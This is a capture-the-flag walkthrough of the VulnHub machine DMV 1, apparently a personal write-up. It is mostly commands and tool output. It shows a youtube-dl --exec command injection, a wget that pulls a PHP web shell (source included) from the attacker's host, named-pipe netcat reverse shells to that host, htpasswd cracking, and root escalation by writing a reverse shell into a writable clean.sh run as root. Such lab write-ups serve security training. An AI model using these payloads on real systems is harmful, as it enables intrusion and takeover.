
# DMV 1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/dmv-1,462/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.183   08:00:27:a9:29:0b      1      60  PCS Systemtechnik GmbH                                            
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.183
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 15:36 -03
Nmap scan report for 192.168.1.183
Host is up (0.00023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.92 seconds
```

### Web Analysis

```
$ dirb http://192.168.1.183

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jan 23 15:37:35 2021
URL_BASE: http://192.168.1.183/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.183/ ----
+ http://192.168.1.183/admin (CODE:401|SIZE:460)                                                                     
==> DIRECTORY: http://192.168.1.183/images/                                                                          
+ http://192.168.1.183/index.php (CODE:200|SIZE:747)                                                                 
==> DIRECTORY: http://192.168.1.183/js/                                                                              
+ http://192.168.1.183/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://192.168.1.183/tmp/                                                                             
                                                                                                                     
---- Entering directory: http://192.168.1.183/images/ ----
---- Entering directory: http://192.168.1.183/js/ ----
---- Entering directory: http://192.168.1.183/tmp/ ----
                                                                                                                     
-----------------
END_TIME: Sat Jan 23 15:37:43 2021
DOWNLOADED: 18448 - FOUND: 3
```

```
$ nikto -h http://192.168.1.183
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.183
+ Target Hostname:    192.168.1.183
+ Target Port:        80
+ Start Time:         2021-01-23 15:37:53 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8067 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2021-01-23 15:40:30 (GMT-3) (157 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.183 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.183
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,js,/,html,php
[+] Timeout:        10s
===============================================================
2021/01/23 15:38:16 Starting gobuster
===============================================================
/index.php (Status: 200)
/admin (Status: 401)
/images (Status: 301)
/js (Status: 301)
/tmp (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/23 15:48:42 Finished
===============================================================
```

### Service Analysis

Analysing Web service, we see a convetion service YouTubeId to MP3.\
To understand the application I made a valid request using a valid random YouTube video ID.\
Intercepting request with Burp Suite proxy we can find the `yt_url` parameter in request:
```
POST / HTTP/1.1
Host: 192.168.1.183
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://192.168.1.183
Connection: close
Referer: http://192.168.1.183/

yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DvyqSdJLVQgg
```

In the response we can find a JSON body:
```
{
    "status":1,
    "errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: vyqSdJLVQgg: YouTube said: Unable to extract video data\n",
    "url_orginal":"https://www.youtube.com/watch?v=vyqSdJLVQgg",
    "output":"[youtube] vyqSdJLVQgg: Downloading webpage\n",
    "result_url":"/tmp/downloads/600c788b46a32.mp3"
}
```

I searched by `youtube-dl` service ( https://github.com/ytdl-org/youtube-dl/blob/master/README.md ):
```
youtube-dl is a command-line program to download videos from YouTube.com and a few more sites.
It requires the Python interpreter, version 2.6, 2.7, or 3.2+, and it is not platform specific.
It should work on your Unix box, on Windows or on macOS.
It is released to the public domain, which means you can modify it, redistribute it or use it however you like.
```

In its manual, I found a parameter that allows commands execution:
```
--exec CMD

Execute a command on the file after
downloading and post-processing, similar to
find's -exec syntax. Example: --exec 'adb
push {} /sdcard/Music/ && rm {}'
```

The next step is to validate the possible Remote Code Executon (RCE) vulnerability.

### Validating RCE Vulnerability

Intercepting and poisoning the `yt_url` parameter with `--exec`:
```
POST / HTTP/1.1
Host: 192.168.1.183
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://192.168.1.183
Connection: close
Referer: http://192.168.1.183/

yt_url=--exec<$(id)
```

The response of this request contains the result of `id` command:
```
{
    "status":2,
    "errors":"sh: 1: cannot open uid=33(www-data) gid=33(www-data) groups=33(www-data): No such file\n",
    "url_orginal":"--exec<$(id)",
    "output":"",
    "result_url":"\/tmp\/downloads\/600c850492ef3.mp3"
}
```

### Exploiting RCE

To better interact with this RCE I uploaded the `php_web_shell.php` file.\
It is an PHP WEB Shell based on `https://github.com/andripwn/rce`.\
\
`php_web_shell.php` (the raw file is in this repository)
```
<title>PHP Web Shell</title>
<html>
<body>

    <form id="execute_form" autocomplete="off">
        <b>Command</b><input type="text" name="id" id="id" autofocus="autofocus" style="width: 600px" />
        <input type="submit" value="Execute" />
    </form>

    <!-- PHP code that executes command and outputs cleanly -->
    <?php
        $command = $_GET['id'];
        echo "<b>Executed:</b>  $command";
        echo str_repeat("<br>",2);
        echo "<b>Output:</b>";
        echo str_repeat("<br>",2);
        exec($command . " 2>&1", $output, $return_status);
        if (isset($return_status)):
            if ($return_status !== 0):
                echo "<font color='red'>Error in Code Execution -->  </font>";
                foreach ($output as &$line) {
                    echo "$line <br>";
                };
            elseif ($return_status == 0 && empty($output)):
                echo "<font color='green'>Command ran successfully, but does not have any output.</font>";
            else:
                foreach ($output as &$line) {
                    echo "$line <br>";
                };
            endif;
        endif;
    ?>
</body>
</html>
```

To upload I used the python simple HTTP server to expose the `php_web_shell.php` file.\
So I used the previously validated RCE vector to perform a `wget` on the target.
```
$ wget http://192.168.1.189:8787/php_web_shell.php
      ^
      |
      |___ Replacing spaces for ${IFS} to send it in request body

$ wget${IFS}http://192.168.1.189:8787/php_web_shell.php
```

The intercepted request will be poisoned as follow:
```
POST / HTTP/1.1
Host: 192.168.1.183
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://192.168.1.183
Connection: close
Referer: http://192.168.1.183/

yt_url=--exec<$(wget${IFS}http://192.168.1.189:8787/php_web_shell.php)
```

Now to use PHP Web Shell we need just access `http://192.168.1.183/php_web_shell.php`.

### Reverse Shell

First I attempt to use `netcat` to get a reverse shell, but target's `netcat` doesn't have `-e` option.
```
nc: invalid option -- 'e'
This is nc from the netcat-openbsd package. An alternative nc is available
in the netcat-traditional package.
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
[-P proxy_username] [-p source_port] [-q seconds] [-s source]
[-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
[-x proxy_address[:port]] [destination] [port]
```

So I ran `netcat` using file descriptor mechanism to get remote shell connection.\
\
Listening `4545` port on my host
```
$ nc -lvp 4545
listening on [any] 4545 ...
```

Running bind connection on target through PHP WEB Shell
```
$ mknod /tmp/backpipe p
$ /bin/sh 0</tmp/backpipe | nc 192.168.1.189 4646 1>/tmp/backpipe
```

Now we have the interactive reverse shell
```
192.168.1.183: inverse host lookup failed: Unknown host
connect to [192.168.1.189] from (UNKNOWN) [192.168.1.183] 48926

python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@dmv:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Flag #1

```
www-data@dmv:/var/www/html/admin$ cat flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

### SysAdmin Account

Looking into `/var/www/html/admin` we found `.htaccess` and `.htpasswd` configuration files:
```
www-data@dmv:/var/www/html/admin$ cat .htaccess
AuthName "AdminArea"
AuthType Basic
AuthUserFile /var/www/html/admin/.htpasswd
Require valid-user

www-data@dmv:/var/www/html/admin$ cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

### Cracking SysAdmin Password Hash

The password hash was easyly cracked by John The Ripper
```
$ cat admin.hash 
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/

$ john -wordlist=/usr/share/wordlists/rockyou.txt admin.hash 

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jessie           (itsmeadmin)
1g 0:00:00:00 DONE (2021-01-23 20:33) 50.00g/s 28800p/s 28800c/s 28800C/s 123456..parola
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Credentials:
* User: **itsmeadmin**
* Pass: **jessie**

### Login with Admin Credentials

After login into `http://192.168.1.183/admin` with retrieved admin credentials, we found a "Clean Downloads" button.\
When we press it, a `rm` command is exposed in URL as paramenter `c` content.\
We just found other RCE vector.
```
http://192.168.1.183/admin/?c=rm%20-rf%20/var/www/html/tmp/downloads
                            ^
                            |___ RCE Vector
```

Although, it has the same privilege than our previous RCE vector.
```
http://192.168.1.183/admin/?c=id

uid=33(www-data) gid=33(www-data) groups=33(www-data) Done :) 
```

### Privilege Escalation

Walking through the machine folders, we found a `/var/www/html/tmp/clean.sh` script that runs on every "Clean Downloads" interaction.\
To be able to remove `/var/www/html/tmp/downloads` folder, the `clean.sh` script must to run as root.\
However, `www-data` user has write permission on it.
```
www-data@dmv:/var/www/html/tmp$ ls -lah
drwxr-xr-x 2 www-data www-data 4.0K Jan 24 00:21 .
drwxr-xr-x 6 www-data www-data 4.0K Jan 23 23:27 ..
-rw-r--r-- 1 www-data www-data   30 Jan 24 00:20 clean.sh

www-data@dmv:/var/www/html/tmp$ cat clean.sh
rm -rf downloads
```

We are able to write in `clean.sh` file:
```
www-data@dmv:/var/www/html/tmp$ echo "id" >> clean.sh

www-data@dmv:/var/www/html/tmp$ cat clean.sh
rm -rf downloads
echo "id" >> clean.sh
```

After click on "Clean Downloads" button, we have the `id.txt` file created.
```
www-data@dmv:/var/www/html/tmp$ ls -lah
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Jan 24 00:21 .
drwxr-xr-x 6 www-data www-data 4.0K Jan 23 23:27 ..
-rw-r--r-- 1 www-data www-data   42 Jan 24 00:27 clean.sh
-rw-r--r-- 1 root     root       39 Jan 24 00:29 id.txt

www-data@dmv:/var/www/html/tmp$ cat id.txt
uid=0(root) gid=0(root) groups=0(root)
```

With the proven concept, I wrote the reverse shell connection in `clean.sh` to be ran as root.
```
www-data@dmv:/var/www/html/tmp$ echo "mknod /tmp/backpipe3 p" > clean.sh
www-data@dmv:/var/www/html/tmp$ echo "/bin/sh 0</tmp/backpipe3 | nc 192.168.1.189 4646 1>/tmp/backpipe3" >> clean.sh

www-data@dmv:/var/www/html/tmp$ cat clean.sh
mknod /tmp/backpipe3 p
/bin/sh 0</tmp/backpipe3 | nc 192.168.1.189 4646 1>/tmp/backpipe3
```

Listen `4646` port on my host machine.
```
$ nc -lvp 4646
listening on [any] 4646 ...
```

After click on "Clean Downloads" button, we have the root shell.
```
192.168.1.183: inverse host lookup failed: Unknown host
connect to [192.168.1.189] from (UNKNOWN) [192.168.1.183] 33266

python3 -c 'import pty;pty.spawn("/bin/bash")'

root@dmv:/var/www/html/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag #2 - Root

```
root@dmv:~# cat /root/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
```
